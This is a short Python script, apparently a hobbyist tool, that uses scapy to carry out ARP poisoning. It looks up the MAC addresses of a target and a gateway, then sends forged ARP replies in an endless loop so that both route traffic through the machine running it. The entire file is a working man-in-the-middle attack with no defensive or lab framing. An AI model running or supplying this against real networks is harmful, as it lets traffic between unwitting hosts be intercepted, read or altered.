from time import sleep
from scapy.all import *
import argparse

parser = argparse.ArgumentParser(description='Arp poisning  ')
parser.add_argument('-t', type=str, required=False)
parser.add_argument('-g', type=str, required=False)

args = parser.parse_args()


target = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op= 1, pdst= args.t)
gateway = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op= 1, pdst= args.g)

received_t= srp(target)
received_g= srp(gateway)


print(f'This is target MAC: {received_t[0][0][1].hwsrc}')
print(f'This is Gateway MAC: {received_g[0][0][1].hwsrc}')


def spoof():
    while True:
        send(ARP(op=2, pdst=args.t, psrc=args.g, hwdst=received_t[0][0][1].hwsrc))
        send(ARP(op=2, pdst=args.g, psrc=args.t, hwdst=received_g[0][0][1].hwsrc))
        sleep(1)

spoof()

